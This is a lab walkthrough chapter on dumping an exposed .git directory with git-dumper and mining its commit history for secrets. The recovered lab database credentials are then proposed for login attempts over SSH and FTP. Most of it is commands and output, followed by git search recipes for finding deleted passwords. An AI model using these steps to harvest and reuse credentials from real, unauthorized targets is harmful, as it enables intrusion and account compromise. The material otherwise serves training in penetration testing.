# 03 — Dumping the repository

Goal: reconstruct the full working tree *and* the full history from the exposed `.git` directory,
then read the history as a source of credentials rather than as a changelog.

---

## 3.1 git-dumper

`git-dumper` walks the repository over HTTP: it pulls `.git/HEAD`, resolves the ref, downloads the
index, then fetches every object reachable from the refs and checks out a working tree.

```bash
pip install --break-system-packages git-dumper
mkdir -p ~/lab/192.168.161.144 && cd ~/lab/192.168.161.144
git-dumper http://192.168.161.144/.git/ ./dump
```

```
[-] Testing http://192.168.161.144/.git/HEAD
[-] Fetching http://192.168.161.144/.git/HEAD
[-] Fetching http://192.168.161.144/.git/objects/info/packs
[-] Fetching http://192.168.161.144/.git/index
[-] Fetching http://192.168.161.144/.git/packed-refs
[-] Fetching http://192.168.161.144/.git/refs/heads/main
[-] Fetching http://192.168.161.144/.git/logs/HEAD
[-] Fetching http://192.168.161.144/.git/objects/…
[-] Checking out files…
```

There is no packfile here (`objects/info/packs` is empty), so every object is loose and individually
fetchable. That is the easy case.

Do not use `--no-checkout`: the checkout is what gives you the files, and checking out a local
directory of someone else's repository is harmless. What you must *not* do is `git clone` from the
leaked remote URL using the leaked token.

---

## 3.2 What came down

```bash
cd dump && git ls-files
```

```
README.md
api/export.php
api/index.php
api/order.php
configuration/database.php
orders/search.php
robots.txt
```

Seven files. A small, ordinary-looking internal project:

```bash
cat README.md robots.txt
```

```
# dev
PWK Challenge Labs
```

```
User-agent: *
Allow /
```

The README confirms what the hostname already suggested — this is a challenge-lab development
repository. Nothing here is a vulnerability in itself.

---

## 3.3 The configuration file

```bash
cat configuration/database.php
```

```php
<?php
class Database{
    private $host = "localhost";
    private $db_name = "staff";
    private $username = "";
    private $password = "";
// Cleartext creds cannot be added to public repos!
    public $conn;
    public function getConnection() {
        $this->conn = null;
        try{
            $this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name,
                                  $this->username, $this->password);
            $this->conn->exec("set names utf8");
        }catch(PDOException $exception){
            echo "Connection error: " . $exception->getMessage();
        }
        return $this->conn;
    }
}
?>
```

The credentials are blank — and there is a comment explaining exactly why. Read that comment
carefully:

> `// Cleartext creds cannot be added to public repos!`

This is the most useful line in the entire repository. It says, in the developer's own words, that
cleartext credentials **were** added to this public repository at some point, and that someone
noticed afterwards and blanked them. The fix was applied to the file. It was not applied to the
history.

In git, that distinction is everything.

---

## 3.4 Reading history

```bash
git log --all --oneline
```

```
44a055d Security Update
621a2e7 Create database.php
c9c8e8b Delete database.php
eda55ed Create robots.txt
ce3d418 Create search.php
80ad5fe Setting up database.php
58cfadc Create index.php
5e212bc Create order.php
0822a51 Create export.php
1c48db4 Initial commit
```

Ten commits. Two of them are named after `database.php` after a delete-and-recreate cycle — which is
itself a tell: if a file was deleted and re-added, the earlier version is not the same file, and
both versions are still in the object database.

`Security Update` is the commit that blanked the values. Its parent is where they were.

```bash
git show 44a055d
```

```
commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54
Author: Stuart <luke@challenge.pwk>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

diff --git a/configuration/database.php b/configuration/database.php
index 55b1645..8ad08b0 100644
--- a/configuration/database.php
+++ b/configuration/database.php
@@ -2,8 +2,9 @@
 class Database{
     private $host = "localhost";
     private $db_name = "staff";
-    private $username = "stuart@challenge.lab";
-    private $password = "BreakingBad92";
+    private $username = "";
+    private $password = "";
+// Cleartext creds cannot be added to public repos!
     public $conn;
```

The `-` lines are the whole finding:

```
stuart@challenge.lab : BreakingBad92
```

And one commit earlier, a different account with the *same* password:

```bash
git show 80ad5fe:configuration/database.php
```

```php
class Database{
    private $host = "localhost";
    private $db_name = "staff";
    private $username = "dean@challenge.pwk";
    private $password = "BreakingBad92";
```

But this commit's tree stores the file at `config/database.php`, not
`configuration/database.php`:

```bash
git ls-tree -r --name-only 80ad5fe
```

```
README.md
api/export.php
api/index.php
api/order.php
config/database.php
orders/search.php
robots.txt
```

The directory was renamed in `621a2e7`. That is why `git show 80ad5fe:configuration/database.php`
fails with *"path does not exist"* — a path in git history is `(commit, path)`, not just `path`.

---

## 3.5 What we have

| Username | Password | Source |
|---|---|---|
| `stuart@challenge.lab` | `BreakingBad92` | `44a055d^` — the line `Security Update` deleted |
| `dean@challenge.pwk` | `BreakingBad92` | `80ad5fe:config/database.php` |

Two application accounts. Both look like email-shaped database logins — `@challenge.lab`,
`@challenge.pwk` — which on a host named `…-ubuntu2204-…` is worth testing directly. People reuse
database usernames as UNIX usernames more often than they should, and `stuart` is the commit author.

```bash
git log --format='%h %an <%ae>' | sort -u
```

```
44a055d Stuart <luke@challenge.pwk>
…
```

`stuart` signs the commits. That makes `stuart` / `BreakingBad92` the first credential pair to try
against SSH and FTP — both of which `nmap` already told us are listening.

---

## 3.6 Querying history directly

Two habits that scale better than `git log | less` when the repository is large:

```bash
# every version of every file in every commit, as pickaxe hits
git log --all -p -S'password' -- . | less

# every blob that ever existed, including from deleted branches
git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(rest)' |
  awk '$1=="blob"{print $3}' | sort -u
```

`-S` (pickaxe) finds commits where the *number of occurrences* of a string changed — which is
exactly how you find both the addition and the removal of a secret in one pass. If `Security Update`
had been buried among two hundred commits, `git log -S'BreakingBad92'` would have surfaced it in one
command.
